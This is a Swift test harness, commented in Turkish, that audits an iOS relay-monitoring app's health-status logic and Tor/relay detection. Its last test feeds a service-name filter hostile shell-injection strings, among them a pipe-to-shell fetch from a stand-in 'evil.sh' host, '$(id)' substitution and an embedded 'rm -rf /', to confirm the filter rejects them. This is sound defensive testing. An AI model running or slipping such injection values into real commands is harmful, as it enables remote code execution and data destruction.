// RelayPulse iOS izole denetim kosumu: gercek kaynak dosyalar derlenir,
// fonksiyonlar dusmanca girdilerle calistirilir. Ag/SwiftUI/simulator yok.
//
//   swiftc -Onone -o /tmp/rp-audit RelayPulse/Models/AgentMetrics.swift scripts/audit/main.swift
//
// Bilerek `assert` YOK: assert -O ile derlenince kaybolur ve kosum hicbir sey
// kontrol etmeden yesil doner. Basarisizlik exit koduyla bildirilir.
import Foundation

var pass = 0, fail = 0
func check(_ name: String, _ body: () throws -> Void) {
    do { try body(); pass += 1; print("PASS \(name)") }
    catch { fail += 1; print("FAIL \(name) - \(error)") }
}
struct Bad: Error, CustomStringConvertible { let description: String }
func expect(_ c: Bool, _ m: String) throws { if !c { throw Bad(description: m) } }

func metrics(_ json: String) throws -> AgentMetrics {
    try JSONDecoder().decode(AgentMetrics.self, from: json.data(using: .utf8)!)
}

// 1. Cokmus servisin artik soketi karti YESIL tutmasin.
check("lingering_port_does_not_fake_active") {
    let m = try metrics(#"{"anon":{"active":"inactive","ports":["0.0.0.0:9001"],"services":{"anon":"inactive"}}}"#)
    try expect(m.anonHealthy(expectService: true) == false, "servis inactive ama artik soket yuzunden SAGLIKLI sayildi")
    try expect(m.anonLabel == "inactive", "etiket yanlis: \(m.anonLabel)")
}
check("failed_service_with_port_is_not_healthy") {
    let m = try metrics(#"{"anon":{"active":"failed","ports":["[::]:9030"],"services":{"anon":"failed"}}}"#)
    try expect(m.anonHealthy(expectService: true) == false, "failed servis port yuzunden saglikli sayildi")
}

// 2. Gercek saglikli vakalar bozulmasin.
check("real_active_still_healthy") {
    try expect(try metrics(#"{"anon":{"active":"active","ports":["0.0.0.0:9001"]}}"#).anonHealthy(expectService: true), "gercek active kayboldu")
    try expect(try metrics(#"{"anon":{"active":"activating","ports":[]}}"#).anonHealthy(expectService: true), "activating kayboldu")
}
check("port_only_detection_kept_when_service_unknown") {
    // Servis durumu hic okunamadi ama port dinleniyor → saglikli (masaustu parseAnon ile ayni).
    let m = try metrics(#"{"anon":{"active":"","ports":["0.0.0.0:9001"],"services":{}}}"#)
    try expect(m.anonHealthy(expectService: true), "servis durumu bilinmiyorken dinleyen port yok sayildi")
}

// 3. Veri hic gelmediginde etiket bos gosterilmeli ('—'), 'inactive' degil.
check("no_data_labelled_dash") {
    let m = try metrics(#"{"anon":{"active":"","ports":[],"services":{}}}"#)
    try expect(m.anonLabel == "—", "veri yokken etiket: \(m.anonLabel)")
}
check("missing_anon_block_is_not_a_crash") {
    let m = try metrics(#"{"ts":1.0}"#)
    try expect(m.anonHealthy(expectService: true) == false && m.anonLabel == "—", "anon blogu yokken tutarsiz")
}

// 3b. Izlenen servisi olmayan NORMAL sunucu sari olmamali; relay oldugu bilinen
// sunucuda ayni durum hala suphe (eski agent durmus birimi dusurur).
check("plain_server_without_watched_unit_is_healthy") {
    let m = try metrics(#"{"anon":{"active":"unknown","ports":[],"services":{}}}"#)
    try expect(m.anonHealthy(expectService: false), "relay olmayan sunucu servis yuzunden sari oldu")
    try expect(m.anonHealthy(expectService: true) == false, "relay sunucusunda servis bilgisi yokken yesil kaldi")
}
check("relay_detection_by_unit_name") {
    try expect(try metrics(#"{"anon":{"services":{"anon1.service":"active"}}}"#).runsRelay, "anon1 relay sayilmadi")
    try expect(try metrics(#"{"anon":{"services":{"tor@default":"active"}}}"#).runsRelay, "tor relay sayilmadi")
    try expect(try metrics(#"{"anon":{"services":{"nginx":"active"}}}"#).runsRelay == false, "nginx relay sayildi")
    try expect(try metrics(#"{"ts":1.0}"#).runsRelay == false, "veri yokken relay sayildi")
}

// 4. Izlenen servis adlari uzak kabuga tirnaksiz gomuluyor — filtre tutuyor mu?
check("watch_service_names_reject_shell_metacharacters") {
    let hostile = ["anon; curl evil.sh|sh", "anon$(id)", "anon`id`", "anon'", "anon\nrm -rf /", "an on", "anon&&id"]
    for h in hostile {
        let ok = h.range(of: "^[A-Za-z0-9@._-]+$", options: .regularExpression) != nil
        try expect(!ok, "kabuk metakarakteri filtreyi gecti: \(h.debugDescription)")
    }
    for good in ["anon", "anon@default", "anyone-relay", "tor-anon", "a.b_c"] {
        try expect(good.range(of: "^[A-Za-z0-9@._-]+$", options: .regularExpression) != nil, "gecerli ad reddedildi: \(good)")
    }
}

print("\n\(pass + fail) kontrol: \(pass) PASS, \(fail) FAIL")
exit(fail == 0 ? 0 : 1)
